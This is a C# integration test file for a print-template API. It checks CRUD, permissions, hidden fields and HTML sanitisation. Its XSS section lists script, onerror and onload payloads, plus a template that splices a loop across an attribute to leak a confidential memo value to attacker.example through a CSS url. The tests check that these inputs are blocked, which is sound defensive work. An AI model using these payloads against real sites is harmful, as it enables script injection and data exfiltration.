using System.Net;
using System.Net.Http.Json;
using DynamicModules.Domain.Data;
using DynamicModules.Domain.Entities.Dynamic;
using FluentAssertions;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.DependencyInjection;
using static DynamicModules.WebAPITests.Dynamic.ApiTestKit;

namespace DynamicModules.WebAPITests.Dynamic;

/// <summary>列印範本：設計器 CRUD、驗證與淨化、權限與欄位可見性、XSS、缺漏時的行為。</summary>
public class PrintApiTests : IDisposable
{
    private readonly TestApp _app = new();
    private readonly HttpClient _admin;
    private readonly HttpClient _sales;

    public PrintApiTests()
    {
        _admin = _app.AsUser();
        _sales = _app.AsUser("sales01");
    }

    public void Dispose() => _app.Dispose();

    private sealed record World(
        string Parent, string Child, string Title, string Memo, long MemoId, string Amount, long AmountId, string Item, string Qty, long RecordId);

    private static readonly Dictionary<string, string> Name = new() { ["zh-TW"] = "報價單" };

    /// <summary>表頭（標題、備註、金額）加一個明細模組（品名、數量），一筆有兩列明細的記錄。</summary>
    private async Task<World> MakeWorld(string memo = "備註內容", HttpClient? creator = null)
    {
        var parent = await CreateModule(_admin);
        var memoField = await AddField(_admin, parent, "text");
        var amount = await AddField(_admin, parent, "currency", new { scale = 2 });
        var child = await CreateModule(_admin);
        await AddField(_admin, child, "reference", new { refTarget = new { kind = "module", key = parent }, relation = "detail" });
        var qty = await AddField(_admin, child, "decimal", new { scale = 2 });
        await Activate(_admin, parent);
        await Activate(_admin, child);
        _app.GrantBusinessGroups(parent);
        _app.GrantBusinessGroups(child);
        var title = await TitleKey(_admin, parent);
        var item = await TitleKey(_admin, child);
        var created = await (creator ?? _admin).PostAsJsonAsync($"{Base}/modules/{parent}/records", new
        {
            values = new Dictionary<string, object> { [title] = "Q-001", [memoField.Key] = memo, [amount.Key] = 1234.5 },
            details = new Dictionary<string, object[]>
            {
                [child] = [
                    new { values = new Dictionary<string, object> { [item] = "螺絲", [qty.Key] = 2.5 } },
                    new { values = new Dictionary<string, object> { [item] = "墊片", [qty.Key] = 10 } }]
            }
        });
        created.StatusCode.Should().Be(HttpStatusCode.Created, await created.Content.ReadAsStringAsync());
        return new World(parent, child, title, memoField.Key, memoField.Id, amount.Key, amount.Id, item, qty.Key,
            (await JsonOf(created)).GetProperty("id").GetInt64());
    }

    private Task<HttpResponseMessage> Create(HttpClient c, string module, string key, string body, bool active = true) =>
        c.PostAsJsonAsync($"{Base}/modules/{module}/print-templates", new { key, name = Name, body, active });

    private Task<HttpResponseMessage> Print(HttpClient c, long recordId, string key, string? locale = null) =>
        c.GetAsync($"{Base}/records/{recordId}/print/{key}" + (locale is null ? "" : $"?locale={locale}"));

    private static string FullBody(World w) =>
        $"<h1>{{{{_title}}}}</h1><p>{{{{{w.Memo}}}}}</p><p>金額 {{{{{w.Amount}}}}}</p>" +
        $"<table><tbody>{{{{#each {w.Child}}}}}<tr><td>{{{{_index}}}}</td><td>{{{{{w.Item}}}}}</td><td>{{{{{w.Qty}}}}}</td></tr>{{{{/each}}}}</tbody></table>";

    private async Task<string> PrintOk(HttpClient c, World w, string key = "quote")
    {
        var res = await Print(c, w.RecordId, key);
        res.StatusCode.Should().Be(HttpStatusCode.OK, await res.Content.ReadAsStringAsync());
        return await res.Content.ReadAsStringAsync();
    }

    private void Db(Action<DynamicDbContext> act)
    {
        using var scope = _app.Services.CreateScope();
        var db = scope.ServiceProvider.GetRequiredService<DynamicDbContext>();
        act(db);
        db.SaveChanges();
    }

    // ---- 設計器 ----

    [Fact]
    public async Task Designer_CreateListUpdateDelete()
    {
        var w = await MakeWorld();
        var created = await Create(_admin, w.Parent, "quote", FullBody(w));
        created.StatusCode.Should().Be(HttpStatusCode.Created, await created.Content.ReadAsStringAsync());

        var list = await JsonOf(await _admin.GetAsync($"{Base}/modules/{w.Parent}/print-templates/definitions"));
        list.GetArrayLength().Should().Be(1);
        list[0].GetProperty("key").GetString().Should().Be("quote");
        list[0].GetProperty("body").GetString().Should().Contain(w.Memo);

        var put = await _admin.PutAsJsonAsync($"{Base}/modules/{w.Parent}/print-templates/quote",
            new { key = "quote", name = Name, body = "<p>新版</p>", active = false });
        put.StatusCode.Should().Be(HttpStatusCode.OK);
        (await JsonOf(await _admin.GetAsync($"{Base}/modules/{w.Parent}/print-templates/definitions")))[0].GetProperty("active").GetBoolean().Should().BeFalse();

        (await _admin.DeleteAsync($"{Base}/modules/{w.Parent}/print-templates/quote")).StatusCode.Should().Be(HttpStatusCode.OK);
        (await JsonOf(await _admin.GetAsync($"{Base}/modules/{w.Parent}/print-templates/definitions"))).GetArrayLength().Should().Be(0);
        (await _admin.DeleteAsync($"{Base}/modules/{w.Parent}/print-templates/quote")).StatusCode.Should().Be(HttpStatusCode.NotFound);
    }

    [Fact]
    public async Task Designer_MultipleTemplatesPerModule_DuplicateKeyIs409()
    {
        var w = await MakeWorld();
        (await Create(_admin, w.Parent, "quote", "<p>a</p>")).StatusCode.Should().Be(HttpStatusCode.Created);
        (await Create(_admin, w.Parent, "delivery", "<p>b</p>")).StatusCode.Should().Be(HttpStatusCode.Created);
        (await Create(_admin, w.Parent, "quote", "<p>c</p>")).StatusCode.Should().Be(HttpStatusCode.Conflict);
        (await JsonOf(await _admin.GetAsync($"{Base}/modules/{w.Parent}/print-templates/definitions"))).GetArrayLength().Should().Be(2);
    }

    [Fact]
    public async Task Designer_NonDesignerIsForbidden()
    {
        var w = await MakeWorld();
        (await Create(_sales, w.Parent, "quote", "<p>a</p>")).StatusCode.Should().Be(HttpStatusCode.Forbidden);
        (await _sales.GetAsync($"{Base}/modules/{w.Parent}/print-templates/definitions")).StatusCode.Should().Be(HttpStatusCode.Forbidden);
        (await _sales.DeleteAsync($"{Base}/modules/{w.Parent}/print-templates/quote")).StatusCode.Should().Be(HttpStatusCode.Forbidden);
    }

    [Theory]
    [InlineData("Bad Key")]
    [InlineData("1abc")]
    [InlineData("a")]
    public async Task Designer_BadKey_400(string key)
    {
        var w = await MakeWorld();
        (await Create(_admin, w.Parent, key, "<p>a</p>")).StatusCode.Should().Be(HttpStatusCode.BadRequest);
    }

    [Theory]
    [InlineData("<p>{{f_999999}}</p>")]
    [InlineData("{{#each no-such-module}}x{{/each}}")]
    [InlineData("{{#each x}}never closed")]
    [InlineData("{{/each}}")]
    public async Task Designer_UnknownFieldBadLoopOrUnknownDetail_400(string body)
    {
        var w = await MakeWorld();
        (await Create(_admin, w.Parent, "quote", body)).StatusCode.Should().Be(HttpStatusCode.BadRequest);
    }

    [Fact]
    public async Task Designer_LoopFieldMustBelongToTheDetailModule()
    {
        var w = await MakeWorld();
        var res = await Create(_admin, w.Parent, "quote", $"{{{{#each {w.Child}}}}}{{{{{w.Memo}}}}}{{{{/each}}}}");
        res.StatusCode.Should().Be(HttpStatusCode.BadRequest);
    }

    [Fact]
    public async Task Designer_BodyIsSanitizedBeforeItIsStored()
    {
        var w = await MakeWorld();
        var body = """<p onclick="x()">hi</p><script>alert(1)</script><a href="javascript:alert(1)">l</a>""";
        (await Create(_admin, w.Parent, "quote", body)).StatusCode.Should().Be(HttpStatusCode.Created);
        var stored = (await JsonOf(await _admin.GetAsync($"{Base}/modules/{w.Parent}/print-templates/definitions")))[0].GetProperty("body").GetString()!;
        stored.Should().Be("<p>hi</p><a>l</a>");
    }

    [Fact]
    public async Task Designer_CannotChangeKeyOnUpdate()
    {
        var w = await MakeWorld();
        await Create(_admin, w.Parent, "quote", "<p>a</p>");
        var res = await _admin.PutAsJsonAsync($"{Base}/modules/{w.Parent}/print-templates/quote", new { key = "other", name = Name, body = "<p>a</p>", active = true });
        res.StatusCode.Should().Be(HttpStatusCode.BadRequest);
    }

    [Fact]
    public async Task Designer_DetailModuleCannotHaveTemplates()
    {
        var w = await MakeWorld();
        (await Create(_admin, w.Child, "quote", "<p>a</p>")).StatusCode.Should().Be(HttpStatusCode.NotFound);
    }

    // ---- 列印 ----

    [Fact]
    public async Task Print_FillsHeaderAndDetailLoop_WithScreenNumberFormatting()
    {
        var w = await MakeWorld();
        await Create(_admin, w.Parent, "quote", FullBody(w));
        var res = await Print(_admin, w.RecordId, "quote");

        res.StatusCode.Should().Be(HttpStatusCode.OK);
        res.Content.Headers.ContentType!.MediaType.Should().Be("text/html");
        res.Headers.GetValues("X-Content-Type-Options").Should().ContainSingle().Which.Should().Be("nosniff");
        res.Headers.GetValues("Content-Security-Policy").Single().Should().Contain("default-src 'none'");
        var html = await res.Content.ReadAsStringAsync();
        html.Should().Contain("<h1>Q-001</h1>").And.Contain("<p>備註內容</p>").And.Contain("金額 1,234.50");
        // 數字照畫面的規則：金額有千分位並補到欄位小數位數，一般數量不補多餘的零
        html.Should().Contain("<tr><td>1</td><td>螺絲</td><td>2.5</td></tr>").And.Contain("<tr><td>2</td><td>墊片</td><td>10</td></tr>");
        html.ToLowerInvariant().Should().NotContain("<script");
    }

    [Fact]
    public async Task Print_OptionsListsOnlyActiveTemplates_WithoutBody()
    {
        var w = await MakeWorld();
        await Create(_admin, w.Parent, "quote", "<p>secret body</p>");
        await Create(_admin, w.Parent, "old", "<p>x</p>", active: false);
        var res = await _sales.GetAsync($"{Base}/modules/{w.Parent}/print-templates");
        res.StatusCode.Should().Be(HttpStatusCode.OK);
        var text = await res.Content.ReadAsStringAsync();
        text.Should().Contain("quote").And.NotContain("old").And.NotContain("secret body");
    }

    [Fact]
    public async Task Print_MissingOrInactiveTemplate_404_NotServerError()
    {
        var w = await MakeWorld();
        (await Print(_admin, w.RecordId, "nope")).StatusCode.Should().Be(HttpStatusCode.NotFound);
        await Create(_admin, w.Parent, "off", "<p>a</p>", active: false);
        (await Print(_admin, w.RecordId, "off")).StatusCode.Should().Be(HttpStatusCode.NotFound);
        (await Print(_admin, 987654, "quote")).StatusCode.Should().Be(HttpStatusCode.NotFound);
    }

    [Fact]
    public async Task Print_DeactivatedOrRemovedFieldPrintsEmpty_NotAnError()
    {
        var w = await MakeWorld();
        await Create(_admin, w.Parent, "quote", $"<p>[{{{{{w.Memo}}}}}]</p>");
        Db(db => db.Set<Field>().Single(f => f.Id == w.MemoId).Status = FieldStatus.Inactive);
        (await PrintOk(_admin, w)).Should().Contain("<p>[]</p>");
    }

    [Fact]
    public async Task Print_FieldHiddenFromTheUsersGroup_PrintsEmpty()
    {
        var w = await MakeWorld();
        await Create(_admin, w.Parent, "quote", FullBody(w));
        await SetSalesPermissions(w, printExport: true, hidden: [w.MemoId]);
        var html = await PrintOk(_sales, w);
        html.Should().NotContain("備註內容").And.Contain("<p></p>").And.Contain("Q-001");
        (await PrintOk(_admin, w)).Should().Contain("備註內容");
    }

    [Fact]
    public async Task Print_AmountWithoutPricingPermission_PrintsEmpty()
    {
        var w = await MakeWorld();
        await Create(_admin, w.Parent, "quote", FullBody(w));
        await SetSalesPermissions(w, printExport: true, pricing: false);
        (await PrintOk(_sales, w)).Should().NotContain("1,234").And.Contain("金額 </p>");
        await SetSalesPermissions(w, printExport: true, pricing: true);
        (await PrintOk(_sales, w)).Should().Contain("金額 1,234.50");
    }

    [Fact]
    public async Task Print_WithoutPrintExportPermission_Forbidden_AndOptionsToo()
    {
        var w = await MakeWorld();
        await Create(_admin, w.Parent, "quote", FullBody(w));
        await SetSalesPermissions(w, printExport: false);
        (await Print(_sales, w.RecordId, "quote")).StatusCode.Should().Be(HttpStatusCode.Forbidden);
        (await _sales.GetAsync($"{Base}/modules/{w.Parent}/print-templates")).StatusCode.Should().Be(HttpStatusCode.Forbidden);
        (await Print(_app.AsUser(null), w.RecordId, "quote")).StatusCode.Should().Be(HttpStatusCode.Unauthorized);
    }

    [Fact]
    public async Task Print_WithReadRevokedButPrintExportKept_Forbidden_AndOptionsToo()
    {
        var w = await MakeWorld();
        await Create(_admin, w.Parent, "quote", FullBody(w));
        await SetSalesPermissions(w, printExport: true, read: false);
        (await Print(_sales, w.RecordId, "quote")).StatusCode.Should().Be(HttpStatusCode.Forbidden);
        (await _sales.GetAsync($"{Base}/modules/{w.Parent}/print-templates")).StatusCode.Should().Be(HttpStatusCode.Forbidden);
    }

    [Fact]
    public async Task Print_OwnScope_CannotPrintSomeoneElsesRecord()
    {
        var w = await MakeWorld(); // admin 建立
        await Create(_admin, w.Parent, "quote", FullBody(w));
        await SetSalesPermissions(w, printExport: true, scope: "own");
        (await Print(_sales, w.RecordId, "quote")).StatusCode.Should().Be(HttpStatusCode.NotFound);
    }

    [Fact]
    public async Task Print_SoftDeletedRecord_404()
    {
        var w = await MakeWorld();
        await Create(_admin, w.Parent, "quote", FullBody(w));
        var rowVersion = (await JsonOf(await _admin.GetAsync($"{Base}/records/{w.RecordId}"))).GetProperty("rowVersion").GetString();
        (await _admin.DeleteAsync($"{Base}/records/{w.RecordId}?rowVersion={rowVersion}")).EnsureSuccessStatusCode();
        (await Print(_admin, w.RecordId, "quote")).StatusCode.Should().Be(HttpStatusCode.NotFound);
    }

    [Fact]
    public async Task Print_ClosedModule_StillPrints()
    {
        var w = await MakeWorld();
        await Create(_admin, w.Parent, "quote", FullBody(w));
        Db(db => db.Set<Module>().Single(m => m.Key == w.Parent).Status = ModuleStatus.Closed);
        (await PrintOk(_admin, w)).Should().Contain("Q-001");
    }

    // ---- XSS ----

    private static readonly string[] Payloads =
    [
        "<script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>",
        "'><svg onload=alert(1)>",
        "</td></tr></table><script>alert(1)</script>",
        "{{#each x}}{{/each}}<b onmouseover=alert(1)>x</b>",
    ];

    [Fact]
    public async Task Xss_RecordValuesAreEscapedInHeaderAndRows()
    {
        foreach (var payload in Payloads)
        {
            var w = await MakeWorld(memo: payload);
            // 明細品名也塞進去
            var rows = (await JsonOf(await _admin.GetAsync($"{Base}/records/{w.RecordId}"))).GetProperty("details").GetProperty(w.Child);
            var rowId = rows[0].GetProperty("id").GetInt64();
            var rowVersion = rows[0].GetProperty("rowVersion").GetString();
            var head = await JsonOf(await _admin.GetAsync($"{Base}/records/{w.RecordId}"));
            var put = await _admin.PutAsJsonAsync($"{Base}/records/{w.RecordId}", new
            {
                rowVersion = head.GetProperty("rowVersion").GetString(),
                values = new Dictionary<string, object>(),
                details = new Dictionary<string, object[]>
                {
                    [w.Child] = [new { id = rowId, rowVersion, values = new Dictionary<string, object> { [w.Item] = payload } }]
                }
            });
            put.StatusCode.Should().Be(HttpStatusCode.OK, await put.Content.ReadAsStringAsync());
            await Create(_admin, w.Parent, "quote", FullBody(w));

            var html = await PrintOk(_admin, w);
            var lower = html.ToLowerInvariant();
            lower.Should().NotContain("<script").And.NotContain("<img").And.NotContain("<svg");
            // 跳脫後的 "onerror=alert(1)" 會以純文字留在內容裡，那是惰性的；要確認的是任何真正的標籤裡都沒有事件屬性
            System.Text.RegularExpressions.Regex.IsMatch(lower, @"<[^>]*[\s/""']on\w+\s*=").Should().BeFalse(html);
            html.Should().Contain("&lt;").And.Contain("&gt;");
        }
    }

    [Fact]
    public async Task Xss_MaliciousTemplateIsSanitizedOnSave()
    {
        var w = await MakeWorld();
        var body = """<script>alert(1)</script><p onclick="alert(1)">x</p><a href="javascript:alert(1)">l</a><img src=x onerror=alert(1)><iframe src="https://evil.example"></iframe>""";
        (await Create(_admin, w.Parent, "quote", body)).StatusCode.Should().Be(HttpStatusCode.Created);
        var html = (await PrintOk(_admin, w)).ToLowerInvariant();
        html.Should().NotContain("<script").And.NotContain("onclick").And.NotContain("javascript:").And.NotContain("<img").And.NotContain("<iframe").And.NotContain("evil.example");
        html.Should().Contain("<p>x</p>");
    }

    [Fact]
    public async Task Xss_TemplateWrittenStraightToTheDatabaseIsStillSanitizedAtPrintTime()
    {
        var w = await MakeWorld();
        await Create(_admin, w.Parent, "quote", "<p>ok</p>");
        Db(db => db.Set<PrintTemplate>().Single().Body =
            """<script>alert(1)</script><div onmouseover="alert(1)">x</div><a href="  JaVaScRiPt:alert(1)">l</a>""");
        var html = (await PrintOk(_admin, w)).ToLowerInvariant();
        html.Should().NotContain("<script").And.NotContain("onmouseover").And.NotContain("javascript:").And.NotContain("alert");
    }

    [Fact]
    public async Task Xss_TitleOfTheTemplateInTheDocumentHeadIsEscaped()
    {
        var w = await MakeWorld();
        var res = await _admin.PostAsJsonAsync($"{Base}/modules/{w.Parent}/print-templates", new
        {
            key = "quote", name = new Dictionary<string, string> { ["zh-TW"] = "</title><script>alert(1)</script>" }, body = "<p>x</p>", active = true
        });
        res.StatusCode.Should().Be(HttpStatusCode.Created);
        (await PrintOk(_admin, w)).ToLowerInvariant().Should().NotContain("<script");
    }

    [Fact]
    public async Task Xss_PlaceholderValueCannotInjectAnotherPlaceholder()
    {
        var w = await MakeWorld(memo: "{{_printedAt}}");
        await Create(_admin, w.Parent, "quote", $"<p>{{{{{w.Memo}}}}}</p>");
        (await PrintOk(_admin, w)).Should().Contain("<p>{{_printedAt}}</p>");
    }

    // ---- 迴圈展開繞過消毒（fix-1 #1）----

    private static string LoopAcrossAttribute(string memoKey, string loopKey = "d") =>
        "<a title=\"{{#each " + loopKey + "}}\">x</a><p>{{/each}}\" style=\"background-image:url(https://attacker.example/?v={{" + memoKey +
        "}})\"><b>X</b></p>";

    [Fact]
    public async Task Xss_LoopMarkersInsideAttributes_RejectedOnSave()
    {
        var w = await MakeWorld();
        var res = await Create(_admin, w.Parent, "quote", LoopAcrossAttribute(w.Memo, w.Child));
        res.StatusCode.Should().Be(HttpStatusCode.BadRequest, await res.Content.ReadAsStringAsync());
        (await JsonOf(await _admin.GetAsync($"{Base}/modules/{w.Parent}/print-templates/definitions"))).GetArrayLength().Should().Be(0);
    }

    [Fact]
    public async Task Xss_LoopSpanningAnAttribute_StoredBeforeTheFix_PrintsNoExternalUrl()
    {
        var w = await MakeWorld(memo: "機密備註");
        await Create(_admin, w.Parent, "quote", "<p>ok</p>");
        // 直接寫進資料庫（模擬舊資料），迴圈對應的明細模組不存在 → 明細為空，展開後會把前後兩段拼起來
        Db(db => db.Set<PrintTemplate>().Single().Body = LoopAcrossAttribute(w.Memo));
        await AssertRefusedWithoutLeak(w);
    }

    [Fact]
    public async Task Xss_LoopSpanningAnAttribute_WithRows_PrintsNoExternalUrl()
    {
        var w = await MakeWorld(memo: "機密備註");
        await Create(_admin, w.Parent, "quote", "<p>ok</p>");
        Db(db => db.Set<PrintTemplate>().Single().Body = LoopAcrossAttribute(w.Memo, w.Child));
        await AssertRefusedWithoutLeak(w);
    }

    /// <summary>範本標記跨過標籤：列印直接拒絕（400），輸出裡沒有外部網址、樣式或欄位值。</summary>
    private async Task AssertRefusedWithoutLeak(World w)
    {
        var res = await Print(_admin, w.RecordId, "quote");
        var text = (await res.Content.ReadAsStringAsync()).ToLowerInvariant();
        res.StatusCode.Should().Be(HttpStatusCode.BadRequest, text);
        text.Should().NotContain("attacker.example").And.NotContain("background-image").And.NotContain("機密備註");
    }

    [Fact]
    public async Task Print_DocumentCarriesAContentSecurityPolicyMeta()
    {
        var w = await MakeWorld();
        await Create(_admin, w.Parent, "quote", "<p>x</p>");
        var html = await PrintOk(_admin, w);
        html.Should().Contain("http-equiv=\"Content-Security-Policy\"").And.Contain("default-src 'none'");
        html.Should().Contain("style-src 'unsafe-inline'").And.Contain("img-src data:");
    }

    // ---- helpers ----

    private async Task SetSalesPermissions(
        World w, bool printExport, bool pricing = true, string scope = "all", long[]? hidden = null, bool read = true)
    {
        var groups = await JsonOf(await _admin.GetAsync($"{Base}/groups"));
        var salesId = groups.EnumerateArray().Single(g => g.GetProperty("key").GetString() == "sales").GetProperty("id").GetInt64();
        var priv = new { read, add = true, edit = true, delete = true, printExport, pricing, approve = false };
        // 明細模組的權限沿用表頭，只設表頭
        var put = await _admin.PutAsJsonAsync($"{Base}/modules/{w.Parent}/permissions", new
        {
            groups = new[] { new { groupId = salesId, privileges = priv, scope } },
            users = Array.Empty<object>(),
            fields = (hidden ?? []).Select(id => new { fieldId = id, groupId = salesId, access = "hidden" }).ToArray(),
            options = Array.Empty<object>()
        });
        put.StatusCode.Should().Be(HttpStatusCode.OK, await put.Content.ReadAsStringAsync());
    }
}
